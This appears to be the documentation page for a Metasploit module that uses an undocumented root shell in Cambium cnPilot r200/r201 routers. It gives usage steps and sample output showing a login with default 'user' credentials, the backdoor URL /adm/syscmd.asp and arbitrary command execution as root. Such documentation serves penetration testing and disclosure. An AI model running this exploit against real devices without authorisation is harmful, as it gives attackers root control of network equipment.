Cambium cnPilot r200/r201 device software versions 4.2.3-R4 and newer, contain an undocumented, backdoor 'root' shell. This shell is accessible via a specific url, to any authenticated user. The module uses this shell to execute arbitrary system commands as 'root'.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/cnpilot_r_cmd_exec```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```set CMD [command]```
5. Do: ```run```

## Sample Output

  ```
msf > use auxiliary/scanner/http/cnpilot_r_cmd_exec
msf auxiliary(cnpilot_r_cmd_exec) > set RHOSTS 1.3.3.7
msf auxiliary(cnpilot_r_cmd_exec) > set RPORT 80
msf auxiliary(cnpilot_r_cmd_exec) > set CMD uname -a
msf auxiliary(cnpilot_r_cmd_exec) > run

[+] 1.3.3.7:80 - Cambium cnPilot confirmed...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "user":"user"
[*] 1.3.3.7:80 - Checking backdoor 'root' shell...
[+] 1.3.3.7:80 - You can access the 'root' shell at: http://1.3.3.7:80/adm/syscmd.asp
[+] 1.3.3.7:80 - Executing command - uname -a
[+]
Linux cnPilot-R201 2.6.36 #1 Thu Feb 9 03:02:39 CST 2017 mips unknown


[+] File saved in: /root/.msf4/loot/20000000000003_default_1.3.3.7_cmdexeclog_12345.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


  ```
